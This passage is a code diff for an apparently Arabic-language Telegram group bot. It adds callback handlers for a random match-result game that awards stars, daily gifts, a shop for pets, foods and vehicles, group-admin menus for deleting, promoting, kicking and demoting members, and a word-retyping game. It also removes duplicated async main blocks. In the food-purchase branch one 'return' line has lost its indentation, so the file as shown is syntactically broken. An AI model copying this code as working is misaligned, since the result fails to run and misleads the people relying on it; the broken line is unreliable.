+            target_uid = int(parts[-1]) if parts[-1].isdigit() else None
+        except ValueError:
+            target_uid = None
 
+    if not (is_owner(chat_id, user_id) or is_admin(chat_id, user_id) or (target_uid and user_id == target_uid)):
+        bot.answer_callback_query(c.id)
+        return
 
-async def main():
-    create_task(reStartPosting())
-    create_task(reVipTime())
-    await app.start()
-    await idle()
+    if data.startswith("close_msg_"):
+        try:
+            bot.delete_message(chat_id, c.message.message_id)
+        except:
+            bot.answer_callback_query(c.id)
+        return
 
-async def main():
-    create_task(reStartPosting2())
-    create_task(reVipTime())
-    await app.start()
-    await idle()
+    if data.startswith("show_result_"):
+        target_uid = int(data.split("_")[2])
+        if target_uid not in ball_status:
+            bot.answer_callback_query(c.id)
+            return
+        results = ["تعادل", "تسجيل", "إخفاق"]
+        result = random.choice(results)
+        stars = {"تعادل": 10, "تسجيل": 25, "إخفاق": 0}[result]
+        ball_status[target_uid]["stars_earned"] = stars
+        ball_status[target_uid]["result"] = result
+        start_time = ball_status[target_uid]["start_time"]
+        duration = int((datetime.now() - start_time).total_seconds())
+        ball_status[target_uid]["duration"] = duration
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("سحب", callback_data=f"claim_stars_{target_uid}"),
+            InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{target_uid}")
+        )
+        bot.edit_message_text(
+            f"النتيجة: {result}\n"
+            f"مدة المباراة: {duration} ثانية\n"
+            f"الربح: {stars} نجمة",
+            chat_id, c.message.message_id, reply_markup=kb
+        )
 
-if __name__=="__main__":
-    loop.run_until_complete(main())
+    elif data.startswith("claim_stars_"):
+        target_uid = int(data.split("_")[2])
+        if target_uid not in ball_status:
+            bot.answer_callback_query(c.id)
+            return
+        stars = ball_status[target_uid]["stars_earned"]
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{target_uid}"))
+        if stars == 0:
+            bot.edit_message_text(
+                "ليس لديك ما تسحبه!",
+                chat_id, c.message.message_id, reply_markup=kb
+            )
+        else:
+            user_balances[target_uid] = user_balances.get(target_uid, 0) + stars
+            bot.edit_message_text(
+                f"تهانينا! لقد سحبت {stars} نجمة إلى رصيدك.",
+                chat_id, c.message.message_id, reply_markup=kb
+            )
+        del ball_status[target_uid]
+
+    elif data.startswith("gift_start_"):
+        target_id = int(data.split("_")[2])
+        initiator_id = int(data.split("_")[3])
+        waiting_gift[user_id] = {"chat_id": chat_id, "message_id": c.message.message_id, "target_id": target_id}
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"gift_back_{target_id}_{user_id}"))
+        bot.edit_message_text("ما هي كمية النجوم التي تريد إهداءها له؟", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("gift_back_"):
+        target_id = int(data.split("_")[2])
+        initiator_id = int(data.split("_")[3])
+        balance = user_balances.get(target_id, 0)
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("إهداء", callback_data=f"gift_start_{target_id}_{user_id}"),
+            InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}")
+        )
+        bot.edit_message_text(f"الرصيد الخاص به: {balance} نجمة", chat_id, c.message.message_id, reply_markup=kb)
+        if user_id in waiting_gift:
+            del waiting_gift[user_id]
+
+    elif data.startswith("daily_gift_"):
+        target_uid = int(data.split("_")[2])
+        if user_id != target_uid:
+            bot.answer_callback_query(c.id)
+            return
+        now = datetime.now().date()
+        last_gift = user_gifts.get(target_uid)
+        kb = InlineKeyboardMarkup()
+        if last_gift == now:
+            kb.add(InlineKeyboardButton("الرجوع", callback_data=f"balance_back_{target_uid}"))
+            bot.edit_message_text("محاولات كثيرة! حاول مرة أخرى غدًا.", chat_id, c.message.message_id, reply_markup=kb)
+            return
+        user_balances[target_uid] = user_balances.get(target_uid, 0) + 25
+        user_gifts[target_uid] = now
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"balance_back_{target_uid}"))
+        bot.edit_message_text("تهانينا! حصلت على 25 نجمة!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("balance_back_"):
+        target_uid = int(data.split("_")[2])
+        balance = user_balances.get(target_uid, 0)
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("الهدية اليومية", callback_data=f"daily_gift_{target_uid}"),
+            InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{target_uid}")
+        )
+        bot.edit_message_text(f"الرصيد الخاص بك: {balance} نجمة", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("welcome_msg_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"admin_commands_{user_id}"))
+        if chat_id in welcome_messages:
+            kb.add(InlineKeyboardButton("تعديل", callback_data=f"edit_welcome_{user_id}"))
+        else:
+            waiting_welcome[user_id] = {"chat_id": chat_id, "message_id": c.message.message_id}
+            bot.edit_message_text(
+                "أرسل الرسالة التي تريدني أن أرسلها عند انضمام أعضاء جدد:",
+                chat_id, c.message.message_id, reply_markup=kb
+            )
+        if chat_id in welcome_messages:
+            bot.edit_message_text(
+                "تم تعيين رسالة الترحيب بالفعل.",
+                chat_id, c.message.message_id, reply_markup=kb
+            )
+
+    elif data.startswith("edit_welcome_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"admin_commands_{user_id}"))
+        bot.edit_message_text(
+            "أرسل الرسالة التي تريدني أن أرسلها عند انضمام أعضاء جدد:",
+            chat_id, c.message.message_id, reply_markup=kb
+        )
+        waiting_welcome[user_id] = {"chat_id": chat_id, "message_id": c.message.message_id}
+
+    elif data.startswith("admin_commands_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("رسالة الترحيب", callback_data=f"welcome_msg_{user_id}"),
+            InlineKeyboardButton("الإحصائيات", callback_data=f"stats_{user_id}"),
+            InlineKeyboardButton("الأدوات", callback_data=f"tools_{user_id}")
+        )
+        bot.edit_message_text("أهلًا، يمكنك تخصيص المجموعة ومراجعتها.", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("tools_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("المسح", callback_data=f"delete_tool_{user_id}"),
+            InlineKeyboardButton("الترقية", callback_data=f"promote_tool_{user_id}"),
+            InlineKeyboardButton("الطرد", callback_data=f"kick_tool_{user_id}"),
+            InlineKeyboardButton("عزل مشرف", callback_data=f"demote_tool_{user_id}"),
+            InlineKeyboardButton("الرجوع", callback_data=f"admin_commands_{user_id}")
+        )
+        bot.edit_message_text("طريقة جديدة للتعامل مع أعضائك!\nالمسح | الترقية | الطرد | عزل مشرف", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("delete_tool_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"tools_{user_id}"))
+        bot.edit_message_text("يكفي أن ترسل مسح كرد على رسالة ليتم حذفها.", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("promote_tool_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجع", callback_data=f"tools_{user_id}"))
+        bot.edit_message_text("يكفي أن ترسل رفع مشرف كرد على رسالة المستخدم لرفعه مشرفا.", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("kick_tool_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"tools_{user_id}"))
+        bot.edit_message_text(
+            "إحظر أي شخص مخالف للقوانين بضغطة واحدة؛ عن طريق إرسال طرد كرد على رسالته.",
+            chat_id, c.message.message_id, reply_markup=kb
+        )
+
+    elif data.startswith("demote_tool_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"tools_{user_id}"))
+        bot.edit_message_text(
+            "أزل الإشراف عن أي مشرف، بالرد على رسالته بـ عزل مشرف.",
+            chat_id, c.message.message_id, reply_markup=kb
+        )
+
+    elif data.startswith("stats_"):
+        try:
+            member_count = bot.get_chat_member_count(chat_id)
+            admins = bot.get_chat_administrators(chat_id)
+            admin_count = len(admins)
+            kb = InlineKeyboardMarkup()
+            kb.add(InlineKeyboardButton("الرجوع", callback_data=f"admin_commands_{user_id}"))
+            bot.edit_message_text(
+                f"الأعضاء: {member_count}\n"
+                f"المشرفون: {admin_count}",
+                chat_id, c.message.message_id, reply_markup=kb
+            )
+        except:
+            bot.answer_callback_query(c.id)
+
+    elif data.startswith("store_animals_"):
+        kb = InlineKeyboardMarkup(row_width=3)
+        buttons = [InlineKeyboardButton(animal, callback_data=f"buy_animal_{animal}_{user_id}") for animal in store_animals.keys() if not animal.startswith("ال")]
+        for i in range(0, len(buttons), 3):
+            kb.add(*buttons[i:i+3])
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"store_back_{user_id}"))
+        bot.edit_message_text("اشترِ حيوانات أليفة رائعة!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("store_foods_"):
+        kb = InlineKeyboardMarkup(row_width=3)
+        buttons = [InlineKeyboardButton(food, callback_data=f"buy_food_{food}_{user_id}") for food in store_foods.keys()]
+        for i in range(0, len(buttons), 3):
+            kb.add(*buttons[i:i+3])
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"store_back_{user_id}"))
+        bot.edit_message_text("اشترِ أطعمة لذيذة!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("store_vehicles_"):
+        kb = InlineKeyboardMarkup(row_width=3)
+        buttons = [InlineKeyboardButton(vehicle, callback_data=f"buy_vehicle_{vehicle}_{user_id}") for vehicle in store_vehicles.keys()]
+        for i in range(0, len(buttons), 3):
+            kb.add(*buttons[i:i+3])
+        kb.add(InlineKeyboardButton("الرجوع", callback_data=f"store_back_{user_id}"))
+        bot.edit_message_text("اشترِ مركبات ممتعة!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("store_back_"):
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("الحيوانات", callback_data=f"store_animals_{user_id}"),
+            InlineKeyboardButton("الأطعمة", callback_data=f"store_foods_{user_id}"),
+            InlineKeyboardButton("المركبات", callback_data=f"store_vehicles_{user_id}"),
+            InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}")
+        )
+        bot.edit_message_text("اشترِ منتجات متنوعة من المتجر!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("buy_animal_"):
+        animal = data.split("_")[2]
+        price = store_animals.get(animal)
+        if not price:
+            bot.answer_callback_query(c.id)
+            return
+        user_animals.setdefault(user_id, {})
+        if animal in user_animals[user_id] or f"ال{animal}" in user_animals[user_id]:
+            kb = InlineKeyboardMarkup()
+            kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+            bot.edit_message_text("أنت تمتلك هذا الحيوان بالفعل!", chat_id, c.message.message_id, reply_markup=kb)
+            return
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("شراء", callback_data=f"confirm_buy_animal_{animal}_{user_id}"),
+            InlineKeyboardButton("الرجوع", callback_data=f"store_back_{user_id}")
+        )
+        bot.edit_message_text(f"هل تريد شراء {animal} بـ {price} نجمة؟", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("buy_food_"):
+        food = data.split("_")[2]
+        price = store_foods.get(food)
+        if not price:
+            bot.answer_callback_query(c.id)
+            return
+        user_foods.setdefault(user_id, {})
+        if food in user_foods[user_id]:
+            kb = InlineKeyboardMarkup()
+            kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+            bot.edit_message_text("أنت تمتلك هذا الطعام بالفعل!", chat_id, c.message.message_id, reply_markup=kb)
+return
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("شراء", callback_data=f"confirm_buy_food_{food}_{user_id}"),
+            InlineKeyboardButton("الرجوع", callback_data=f"store_back_{user_id}")
+        )
+        bot.edit_message_text(f"هل تريد شراء {food} بـ {price} نجمة؟", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("buy_vehicle_"):
+        vehicle = data.split("_")[2]
+        price = store_vehicles.get(vehicle)
+        if not price:
+            bot.answer_callback_query(c.id)
+            return
+        user_vehicles.setdefault(user_id, {})
+        if vehicle in user_vehicles[user_id]:
+            kb = InlineKeyboardMarkup()
+            kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+            bot.edit_message_text("أنت تمتلك هذه المركبة بالفعل!", chat_id, c.message.message_id, reply_markup=kb)
+            return
+        kb = InlineKeyboardMarkup()
+        kb.add(
+            InlineKeyboardButton("شراء", callback_data=f"confirm_buy_vehicle_{vehicle}_{user_id}"),
+            InlineKeyboardButton("الرجوع", callback_data=f"store_back_{user_id}")
+        )
+        bot.edit_message_text(f"هل تريد شراء {vehicle} بـ {price} نجمة؟", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("confirm_buy_animal_"):
+        animal = data.split("_")[2]
+        price = store_animals.get(animal)
+        if not price:
+            bot.answer_callback_query(c.id)
+            return
+        balance = user_balances.get(user_id, 0)
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+        if balance < price:
+            bot.edit_message_text("ليس لديك رصيد كافٍ!", chat_id, c.message.message_id, reply_markup=kb)
+            return
+        user_animals[user_id][animal] = price
+        user_balances[user_id] = balance - price
+        bot.edit_message_text(f"تهانينا! اشتريت {animal}!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("confirm_buy_food_"):
+        food = data.split("_")[2]
+        price = store_foods.get(food)
+        if not price:
+            bot.answer_callback_query(c.id)
+            return
+        balance = user_balances.get(user_id, 0)
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+        if balance < price:
+            bot.edit_message_text("ليس لديك رصيد كافٍ!", chat_id, c.message.message_id, reply_markup=kb)
+            return
+        user_foods[user_id][food] = price
+        user_balances[user_id] = balance - price
+        bot.edit_message_text(f"تهانينا! اشتريت {food}!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("confirm_buy_vehicle_"):
+        vehicle = data.split("_")[2]
+        price = store_vehicles.get(vehicle)
+        if not price:
+            bot.answer_callback_query(c.id)
+            return
+        balance = user_balances.get(user_id, 0)
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("إغلاق", callback_data=f"close_msg_{user_id}"))
+        if balance < price:
+            bot.edit_message_text("ليس لديك رصيد كافٍ!", chat_id, c.message.message_id, reply_markup=kb)
+            return
+        user_vehicles[user_id][vehicle] = price
+        user_balances[user_id] = balance - price
+        bot.edit_message_text(f"تهانينا! اشتريت {vehicle}!", chat_id, c.message.message_id, reply_markup=kb)
+
+    elif data.startswith("new_word_"):
+        target_uid = int(data.split("_")[2])
+        if user_id != target_uid:
+            bot.answer_callback_query(c.id)
+            return
+        word = random.choice(arabic_words)
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("تخطي", callback_data=f"skip_word_{target_uid}"))
+        bot.edit_message_text(
+            f"أعد إرسال الكلمة، وأحصل على نجوم إضافية: {word}",
+            chat_id, c.message.message_id, reply_markup=kb
+        )
+        words_waiting[target_uid] = {
+            "word": normalize_word(word),
+            "message_id": c.message.message_id,
+            "chat_id": chat_id,
+            "sent_time": datetime.now()
+        }
+
+    elif data.startswith("skip_word_"):
+        target_uid = int(data.split("_")[2])
+        if user_id != target_uid:
+            bot.answer_callback_query(c.id)
+            return
+        word = random.choice(arabic_words)
+        kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton("تخطي", callback_data=f"skip_word_{target_uid}"))
+        bot.edit_message_text(
+            f"أعد إرسال الكلمة، وأحصل على نجوم إضافية: {word}",
+            chat_id, c.message.message_id, reply_markup=kb
+        )
+        words_waiting[target_uid] = {
+            "word": normalize_word(word),
+            "message_id": c.message.message_id,
+            "chat_id": chat_id,
+            "sent_time": datetime.now()
+        }
+
+    bot.answer_callback_query(c.id)
+
+# --- Start the bot ---
+if __name__ == "__main__":
+    print("Bot is running...")
+    bot.infinity_polling()
